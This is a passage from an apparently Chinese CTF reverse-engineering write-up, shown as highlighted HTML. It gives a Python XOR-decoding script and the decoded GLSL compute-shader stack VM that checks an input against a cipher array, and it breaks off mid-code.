class=mh>0x41</span><span class=p>,</span> <span class=mh>0x69</span><span class=p>,</span> <span class=mh>0x78</span><span class=p>,</span> <span class=mh>0x7C</span><span class=p>,</span> <span class=mh>0x5D</span><span class=p>,</span> <span class=mh>0x6E</span><span class=p>,</span> <span class=mh>0x61</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x7A</span><span class=p>,</span> <span class=mh>0x42</span><span class=p>,</span> <span class=mh>0x78</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x3A</span><span class=p>,</span> <span class=mh>0x3F</span><span class=p>,</span> <span class=mh>0x35</span><span class=p>,</span> <span class=mh>0x69</span><span class=p>,</span> <span class=mh>0x41</span><span class=p>,</span> <span class=mh>0x0F</span><span class=p>,</span> <span class=mh>0x0D</span><span class=p>,</span> <span class=mh>0x1D</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x16</span><span class=p>,</span> <span class=mh>0x77</span><span class=p>,</span> <span class=mh>0x6E</span><span class=p>,</span> <span class=mh>0x73</span><span class=p>,</span> <span class=mh>0x76</span><span class=p>,</span> <span class=mh>0x03</span><span class=p>,</span> <span class=mh>0x2B</span><span class=p>,</span> <span class=mh>0x21</span><span class=p>,</span> <span class=mh>0x7E</span><span class=p>,</span> <span class=mh>0x0E</span><span class=p>,</span> <span class=mh>0x5F</span><span class=p>,</span> <span class=mh>0x5D</span><span class=p>,</span> <span class=mh>0x3D</span><span class=p>,</span> <span class=mh>0x43</span><span class=p>,</span> <span class=mh>0x64</span><span class=p>,</span> <span class=mh>0x55</span><span class=p>,</span> <span class=mh>0x73</span><span class=p>,</span> <span class=mh>0x08</span><span class=p>,</span> <span class=mh>0x0B</span><span class=p>,</span> <span class=mh>0x34</span><span class=p>,</span> <span class=mh>0x0D</span><span class=p>,</span> <span class=mh>0x34</span><span class=p>,</span> <span class=mh>0x78</span><span class=p>,</span> <span class=mh>0x7A</span><span class=p>,</span> <span class=mh>0x76</span><span class=p>,</span> <span class=mh>0x3D</span><span class=p>,</span> <span class=mh>0x58</span><span class=p>,</span> <span class=mh>0x7A</span><span class=p>,</span> <span class=mh>0x65</span><span class=p>,</span> <span class=mh>0x68</span><span class=p>,</span> <span class=mh>0x61</span><span class=p>,</span> <span class=mh>0x79</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x5D</span><span class=p>,</span> <span class=mh>0x5A</span><span class=p>,</span> <span class=mh>0x58</span><span class=p>,</span> <span class=mh>0x4E</span><span class=p>,</span> <span class=mh>0x67</span><span class=p>,</span> <span class=mh>0x7A</span><span class=p>,</span> <span class=mh>0x0E</span><span class=p>,</span> <span class=mh>0x22</span><span class=p>,</span> <span class=mh>0x1D</span><span class=p>,</span> <span class=mh>0x75</span><span class=p>,</span> <span class=mh>0x1F</span><span class=p>,</span> <span class=mh>0x75</span><span class=p>,</span> <span class=mh>0x62</span><span class=p>,</span> <span class=mh>0x5E</span><span class=p>,</span> <span class=mh>0x3D</span><span class=p>,</span> <span class=mh>0x79</span><span class=p>,</span> <span class=mh>0x2A</span><span class=p>,</span> <span class=mh>0x05</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x08</span><span class=p>,</span> <span class=mh>0x53</span><span class=p>,</span> <span class=mh>0x3F</span><span class=p>,</span> <span class=mh>0x04</span><span class=p>,</span> <span class=mh>0x7E</span><span class=p>,</span> <span class=mh>0x47</span><span class=p>,</span> <span class=mh>0x73</span><span class=p>,</span> <span class=mh>0x4F</span><span class=p>,</span> <span class=mh>0x67</span><span class=p>,</span> <span class=mh>0x6F</span><span class=p>,</span> <span class=mh>0x67</span><span class=p>,</span> <span class=mh>0x5B</span><span class=p>,</span> <span class=mh>0x4C</span><span class=p>,</span> <span class=mh>0x3E</span><span class=p>,</span> <span class=mh>0x63</span><span class=p>,</span> <span class=mh>0x40</span><span class=p>,</span> <span class=mh>0x69</span><span class=p>,</span> <span class=mh>0x38</span><span class=p>,</span> <span class=mh>0x48</span><span class=p>,</span> <span class=mh>0x77</span><span class=p>,</span> <span class=mh>0x76</span><span class=p>,</span> <span class=mh>0x4D</span><span class=p>,</span> <span class=mh>0x43</span><span class=p>,</span> <span class=mh>0x12</span><span class=p>,</span> <span class=mh>0x35</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x6E</span><span class=p>,</span> <span class=mh>0x1F</span><span class=p>,</span> <span class=mh>0x34</span><span class=p>,</span> <span class=mh>0x15</span><span class=p>,</span> <span class=mh>0x33</span><span class=p>,</span> <span class=mh>0x21</span><span class=p>,</span> <span class=mh>0x50</span><span class=p>,</span> <span class=mh>0x66</span><span class=p>,</span> <span class=mh>0x4D</span><span class=p>,</span> <span class=mh>0x53</span><span class=p>,</span> <span class=mh>0x38</span><span class=p>,</span> <span class=mh>0x04</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x5F</span><span class=p>,</span> <span class=mh>0x2E</span><span class=p>,</span> <span class=mh>0x29</span><span class=p>,</span> <span class=mh>0x3D</span><span class=p>,</span> <span class=mh>0x17</span><span class=p>,</span> <span class=mh>0x28</span><span class=p>,</span> <span class=mh>0x74</span><span class=p>,</span> <span class=mh>0x15</span><span class=p>,</span> <span class=mh>0x75</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x3A</span><span class=p>,</span> <span class=mh>0x3A</span><span class=p>,</span> <span class=mh>0x5A</span><span class=p>,</span> <span class=mh>0x28</span><span class=p>,</span> <span class=mh>0x7C</span><span class=p>,</span> <span class=mh>0x5C</span><span class=p>,</span> <span class=mh>0x63</span><span class=p>,</span> <span class=mh>0x04</span><span class=p>,</span> <span class=mh>0x6E</span><span class=p>,</span> <span class=mh>0x74</span><span class=p>,</span> <span class=mh>0x4A</span><span class=p>,</span> <span class=mh>0x7B</span><span class=p>,</span> <span class=mh>0x5E</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x7A</span><span class=p>,</span> <span class=mh>0x55</span><span class=p>,</span> <span class=mh>0x45</span><span class=p>,</span> <span class=mh>0x68</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x79</span><span class=p>,</span> <span class=mh>0x52</span><span class=p>,</span> <span class=mh>0x32</span><span class=p>,</span> <span class=mh>0x14</span><span class=p>,</span> <span class=mh>0x15</span><span class=p>,</span> <span class=mh>0x76</span><span class=p>,</span> <span class=mh>0x4E</span><span class=p>,</span> <span class=mh>0x54</span><span class=p>,</span> <span class=mh>0x30</span><span class=p>,</span> <span class=mh>0x29</span><span class=p>,</span> <span class=mh>0x3A</span><span class=p>,</span> <span class=mh>0x70</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>,</span> <span class=mh>0x0A</span><span class=p>,</span> <span class=mh>0x14</span><span class=p>,</span> <span class=mh>0x30</span><span class=p>,</span> <span class=mh>0x37</span><span class=p>,</span> <span class=mh>0x5F</span><span class=p>,</span> <span class=mh>0x29</span><span class=p>,</span> <span class=mh>0x43</span><span class=p>,</span> <span class=mh>0x60</span><span class=p>,</span> <span class=mh>0x72</span><span class=p>,</span> <span class=mh>0x7F</span><span class=p>,</span> <span class=mh>0x49</span><span class=p>,</span> <span class=mh>0x7C</span><span class=p>,</span> <span class=mh>0x47</span><span class=p>,</span> <span class=mh>0x67</span><span class=p>,</span> <span class=mh>0x78</span><span class=p>,</span> <span class=mh>0x1A</span><span class=p>,</span> <span class=mh>0x6E</span><span class=p>,</span> <span class=mh>0x41</span><span class=p>,</span> <span class=mh>0x48</span><span class=p>,</span> <span class=mh>0x5F</span><span class=p>,</span> <span class=mh>0x10</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x73</span><span class=p>,</span> <span class=mh>0x76</span><span class=p>,</span> <span class=mh>0x20</span><span class=p>,</span> <span class=mh>0x3F</span><span class=p>,</span> <span class=mh>0x12</span><span class=p>,</span> <span class=mh>0x62</span><span class=p>,</span> <span class=mh>0x4E</span><span class=p>,</span> <span class=mh>0x02</span><span class=p>,</span> <span class=mh>0x3A</span><span class=p>,</span> <span class=mh>0x23</span><span class=p>,</span> <span class=mh>0x37</span><span class=p>,</span> <span class=mh>0x1C</span><span class=p>,</span> <span class=mh>0x0A</span><span class=p>,</span> <span class=mh>0x3B</span><span class=p>,</span> <span class=mh>0x3A</span><span class=p>,</span> <span class=mh>0x0C</span><span class=p>,</span> <span class=mh>0x47</span><span class=p>,</span> <span class=mh>0x41</span><span class=p>,</span> <span class=mh>0x7B</span><span class=p>,</span> <span class=mh>0x7A</span><span class=p>,</span> <span class=mh>0x1E</span><span class=p>,</span> <span class=mh>0x0A</span><span class=p>,</span> <span class=mh>0x3E</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x0D</span><span class=p>,</span> <span class=mh>0x32</span><span class=p>,</span> <span class=mh>0x31</span><span class=p>,</span> <span class=mh>0x27</span><span class=p>,</span> <span class=mh>0x3E</span><span class=p>,</span> <span class=mh>0x67</span><span class=p>,</span> <span class=mh>0x46</span><span class=p>,</span> <span class=mh>0x6A</span><span class=p>,</span> <span class=mh>0x27</span><span class=p>,</span> <span class=mh>0x37</span><span class=p>,</span> <span class=mh>0x2F</span><span class=p>,</span> <span class=mh>0x23</span><span class=p>,</span> <span class=mh>0x2B</span><span class=p>,</span> <span class=mh>0x53</span><span class=p>,</span> <span class=mh>0x6A</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>,</span> <span class=mh>0x7A</span><span class=p>,</span> <span class=mh>0x66</span><span class=p>,</span> <span class=mh>0x5E</span><span class=p>,</span> <span class=mh>0x03</span><span class=p>,</span> <span class=mh>0x7A</span><span class=p>,</span> <span class=mh>0x4D</span><span class=p>,</span> <span class=mh>0x5D</span><span class=p>,</span> <span class=mh>0x77</span><span class=p>,</span> <span class=mh>0x7D</span><span class=p>,</span> <span class=mh>0x02</span><span class=p>,</span> <span class=mh>0x48</span><span class=p>,</span> <span class=mh>0x77</span><span class=p>,</span> <span class=mh>0x17</span><span class=p>,</span> <span class=mh>0x30</span><span class=p>,</span> <span class=mh>0x12</span><span class=p>,</span> <span class=mh>0x78</span><span class=p>,</span> <span class=mh>0x1B</span><span class=p>,</span> <span class=mh>0x7E</span><span class=p>,</span> <span class=mh>0x51</span><span class=p>,</span> <span class=mh>0x4B</span><span class=p>,</span> <span class=mh>0x5C</span><span class=p>,</span> <span class=mh>0x67</span><span class=p>,</span> <span class=mh>0x54</span><span class=p>,</span> <span class=mh>0x57</span><span class=p>,</span> <span class=mh>0x44</span><span class=p>,</span> <span class=mh>0x4C</span><span class=p>,</span> <span class=mh>0x3C</span><span class=p>,</span> <span class=mh>0x01</span><span class=p>,</span> <span class=mh>0x3B</span><span class=p>,</span> <span class=mh>0x23</span><span class=p>,</span> <span class=mh>0x11</span><span class=p>,</span> <span class=mh>0x38</span><span class=p>,</span> <span class=mh>0x0D</span><span class=p>,</span> <span class=mh>0x15</span><span class=p>,</span> <span class=mh>0x34</span><span class=p>,</span> <span class=mh>0x78</span><span class=p>,</span> <span class=mh>0x68</span><span class=p>,</span> <span class=mh>0x12</span><span class=p>,</span> <span class=mh>0x02</span><span class=p>,</span> <span class=mh>0x0E</span><span class=p>,</span> <span class=mh>0x02</span><span class=p>,</span> <span class=mh>0x62</span><span class=p>,</span> <span class=mh>0x62</span><span class=p>,</span> <span class=mh>0x12</span><span class=p>,</span> <span class=mh>0x3C</span><span class=p>,</span> <span class=mh>0x02</span><span class=p>,</span> <span class=mh>0x0D</span><span class=p>,</span> <span class=mh>0x36</span><span class=p>,</span> <span class=mh>0x21</span><span class=p>,</span> <span class=mh>0x3B</span><span class=p>,</span> <span class=mh>0x2A</span><span class=p>,</span> <span class=mh>0x3B</span><span class=p>,</span> <span class=mh>0x24</span><span class=p>,</span> <span class=mh>0x1C</span><span class=p>,</span> <span class=mh>0x7A</span><span class=p>,</span> <span class=mh>0x66</span><span class=p>,</span> <span class=mh>0x4A</span><span class=p>,</span> <span class=mh>0x77</span><span class=p>,</span> <span class=mh>0x7B</span><span class=p>,</span> <span class=mh>0x73</span><span class=p>,</span> <span class=mh>0x58</span><span class=p>,</span> <span class=mh>0x16</span><span class=p>,</span> <span class=mh>0x3F</span><span class=p>,</span> <span class=mh>0x00</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>s</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>^=</span> <span class=mh>0x56</span>
</span></span><span class=line><span class=cl><span class=n>xor</span> <span class=o>=</span> <span class=sa>b</span><span class=s2>&#34;Vm0xd1NtUXlWa1pPVldoVFlUSlNjVlZyV21GVk1XeDBaRVYwYWxadVFsaFdiWFF3VmxkS1IxTnNXbFpXZWtFeFZsUkdTMk15VGtaYVJtUk9ZbXRLZVZacldtdFNNVnBYVm01R1UySkdXbFJVVnpWUFRURmtjbGRzWkU5U01IQXdWa2QwVjFaWFNrbFJiR2hWVm5wV2NsUlVSbFpsUmxwMFQxZG9UbUV5ZHpCWFYzUmhZekZhYzFacVdtbFNXRkpYV1ZkMGQyUnNVbGhsU0dSVVZqQndSMVpITVc5aFZscFlaSHBLVjJKVVFYaFdSRVp6VmpGS1dWcEdVbWxpVmtwdlZsZDRWazFXU2tkaVJtUllZbTFTV0ZWdGRHRk5WbXQzV2toT2FWSnNjRmRaTUdoM1ZqQXhWMk5JV2xkU1JVVjRWbXBHUjJOV1VuTlNiR1JUVWxWVk1RPT0=&#34;</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=mi>1760</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>s</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>^=</span> <span class=n>xor</span><span class=p>[</span><span class=n>i</span><span class=o>%</span><span class=mi>460</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;&#34;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=nb>map</span><span class=p>(</span><span class=nb>chr</span><span class=p>,</span> <span class=n>s</span><span class=p>)))</span>
</span></span></code></pre></td></tr></table></div></div><p>解得GL虚拟机实现代码：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=c1>#version 430 core</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>layout</span><span class=p>(</span><span class=n>local_size_x</span> <span class=o>=</span> <span class=mi>1</span><span class=p>,</span> <span class=n>local_size_y</span> <span class=o>=</span> <span class=mi>1</span><span class=p>,</span> <span class=n>local_size_z</span> <span class=o>=</span> <span class=mi>1</span><span class=p>)</span> <span class=ow>in</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=n>layout</span><span class=p>(</span><span class=n>std430</span><span class=p>,</span> <span class=n>binding</span> <span class=o>=</span> <span class=mi>0</span><span class=p>)</span> <span class=n>buffer</span> <span class=n>OpCodes</span>  <span class=p>{</span> <span class=ne>int</span> <span class=n>opcodes</span><span class=p>[];</span> <span class=p>};</span>
</span></span><span class=line><span class=cl><span class=n>layout</span><span class=p>(</span><span class=n>std430</span><span class=p>,</span> <span class=n>binding</span> <span class=o>=</span> <span class=mi>2</span><span class=p>)</span> <span class=n>buffer</span> <span class=n>CoConsts</span> <span class=p>{</span> <span class=ne>int</span> <span class=n>co_consts</span><span class=p>[];</span> <span class=p>};</span>
</span></span><span class=line><span class=cl><span class=n>layout</span><span class=p>(</span><span class=n>std430</span><span class=p>,</span> <span class=n>binding</span> <span class=o>=</span> <span class=mi>3</span><span class=p>)</span> <span class=n>buffer</span> <span class=n>Cipher</span>   <span class=p>{</span> <span class=ne>int</span> <span class=n>cipher</span><span class=p>[</span><span class=mi>16</span><span class=p>];</span> <span class=p>};</span>
</span></span><span class=line><span class=cl><span class=n>layout</span><span class=p>(</span><span class=n>std430</span><span class=p>,</span> <span class=n>binding</span> <span class=o>=</span> <span class=mi>4</span><span class=p>)</span> <span class=n>buffer</span> <span class=n>Stack</span>    <span class=p>{</span> <span class=ne>int</span> <span class=n>stack_data</span><span class=p>[</span><span class=mi>256</span><span class=p>];</span> <span class=p>};</span>
</span></span><span class=line><span class=cl><span class=n>layout</span><span class=p>(</span><span class=n>std430</span><span class=p>,</span> <span class=n>binding</span> <span class=o>=</span> <span class=mi>5</span><span class=p>)</span> <span class=n>buffer</span> <span class=n>Out</span>      <span class=p>{</span> <span class=ne>int</span> <span class=n>verdict</span><span class=p>;</span>         <span class=p>};</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>const</span> <span class=ne>int</span> <span class=n>MaxInstructionCount</span> <span class=o>=</span> <span class=mi>1000</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>void</span> <span class=n>main</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>gl_GlobalInvocationID</span><span class=o>.</span><span class=n>x</span> <span class=o>&gt;</span> <span class=mi>0</span><span class=p>)</span> <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>uint</span> <span class=n>ip</span> <span class=o>=</span> <span class=mi>0</span><span class=n>u</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=ne>int</span> <span class=n>sp</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=n>verdict</span> <span class=o>=</span> <span class=o>-</span><span class=mi>233</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=p>(</span><span class=n>ip</span> <span class=o>&lt;</span> <span class=n>uint</span><span class=p>(</span><span class=n>MaxInstructionCount</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=ne>int</span> <span class=n>opcode</span> <span class=o>=</span> <span class=n>opcodes</span><span class=p>[</span><span class=ne>int</span><span class=p>(</span><span class=n>ip</span><span class=p>)];</span>
</span></span><span class=line><span class=cl>        <span class=ne>int</span> <span class=n>arg</span>    <span class=o>=</span> <span class=n>opcodes</span><span class=p>[</span><span class=ne>int</span><span class=p>(</span><span class=n>ip</span><span class=p>)</span><span class=o>+</span><span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>switch</span> <span class=p>(</span><span class=n>opcode</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>case</span> <span class=mi>2</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>stack_data</span><span class=p>[</span><span class=n>sp</span><span class=o>++</span><span class=p>]</span> <span class=o>=</span> <span class=n>co_consts</span><span class=p>[</span><span class=n>arg</span><span class=p>];</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=k>case</span> <span class=mi>7</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=ne>int</span> <span class=n>b</span> <span class=o>=</span> <span class=n>stack_data</span><span class=p>[</span><span class=o>--</span><span class=n>sp</span><span class=p>];</span>
</span></span><span class=line><span class=cl>                <span class=ne>int</span> <span class=n>a</span> <span class=o>=</span> <span class=n>stack_data</span><span class=p>[</span><span class=o>--</span><span class=n>sp</span><span class=p>];</span>
</span></span><span class=line><span class=cl>                <span class=n>stack_data</span><span class=p>[</span><span class=n>sp</span><span class=o>++</span><span class=p>]</span> <span class=o>=</span> <span class=n>a</span> <span class=o>+</span> <span class=n>b</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=k>case</span> <span class=mi>8</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=ne>int</span> <span class=n>a</span> <span class=o>=</span> <span class=n>stack_data</span><span class=p>[</span><span class=o>--</span><span class=n>sp</span><span class=p>];</span>
</span></span><span class=line><span class=cl>                <span class=ne>int</span> <span class=n>b</span> <span class=o>=</span> <span class=n>stack_data</span><span class=p>[</span><span class=o>--</span><span class=n>sp</span><span class=p>];</span>
</span></span><span class=line><span class=cl>                <span class=n>stack_data</span><span class=p>[</span><span class=n>sp</span><span class=o>++</span><span class=p>]</span> <span class=o>=</span> <span class=n>a</span> <span class=o>-</span> <span class=n>b</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=k>case</span> <span class=mi>14</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=ne>int</span> <span class=n>b</span> <span class=o>=</span> <span class=n>stack_data</span><span class=p>[</span><span class=o>--</span><span class=n>sp</span><span class=p>];</span>
</span></span><span class=line><span class=cl>                <span class=ne>int</span> <span class=n>a</span> <span class=o>=</span> <span class=n>stack_data</span><span class=p>[</span><span class=o>--</span><span class=n>sp</span><span class=p>];</span>
</span></span><span class=line><span class=cl>                <span class=n>stack_data</span><span class=p>[</span><span class=n>sp</span><span class=o>++</span><span class=p>]</span> <span class=o>=</span> <span class=n>a</span> <span class=o>^</span> <span class=n>b</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>case</span> <span class=mi>15</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=ne>int</span> <span class=n>b</span> <span class=o>=</span> <span class=n>stack_data</span><span class=p>[</span><span class=o>--</span><span class=n>sp</span><span class=p>];</span>
</span></span><span class=line><span class=cl>                <span class=ne>int</span> <span class=n>a</span> <span class=o>=</span> <span class=n>stack_data</span><span class=p>[</span><span class=o>--</span><span class=n>sp</span><span class=p>];</span>
</span></span><span class=line><span class=cl>                <span class=n>stack_data</span><span class=p>[</span><span class=n>sp</span><span class=o>++</span><span class=p>]</span> <span class=o>=</span> <span class=ne>int</span><span class=p>(</span><span class=n>a</span> <span class=o>==</span> <span class=n>b</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>case</span> <span class=mi>16</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=ne>bool</span> <span class=n>ok</span> <span class=o>=</span> <span class=bp>true</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=k>for</span> <span class=p>(</span><span class=ne>int</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;</span> <span class=mi>16</span><span class=p>;</span> <span class=n>i</span><span class=o>++</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=p>(</span><span class=n>stack_data</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>!=</span> <span class=p>(</span><span class=n>cipher</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>-</span> <span class=mi>20</span><span class=p>))</span>
</span></span><span class=line><span class=cl>                    <span class=p>{</span> 
</span></span><span class=line><span class=cl>                        <span class=n>ok</span> <span class=o>=</span> <span class=bp>false</span><span class=p>;</span> 
</span></span><span class=line><span class=cl>                        <span class=k>break</span><span class=p>;</span> 
</span></span><span class=line><span class=cl>                    <span class=p>}</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>                <span class=n>verdict</span> <span class=o>=</span> <span class=n>ok</span> <span class=err>?</span> <span class=mi>1</span> <span class=p>:</span> <span class=o>-</span><span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=k>case</span> <span class=mi>18</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=ne>int</span> <span class=n>c</span> <span class=o>=</span> <span class=n>stack_data</span><span class=p>[</span><span class=o>--</span><span class=n>sp</span><span class=p>];</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(</span><span class=n>c</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=n>ip</span> <span class=o>=</span> <span class=n>uint</span><span class=p>(</span><span class=n>arg</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>            <span class=n>default</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>verdict</span> <span class=o>=</span> <span class=mi>500</span><span class=p>;</span>
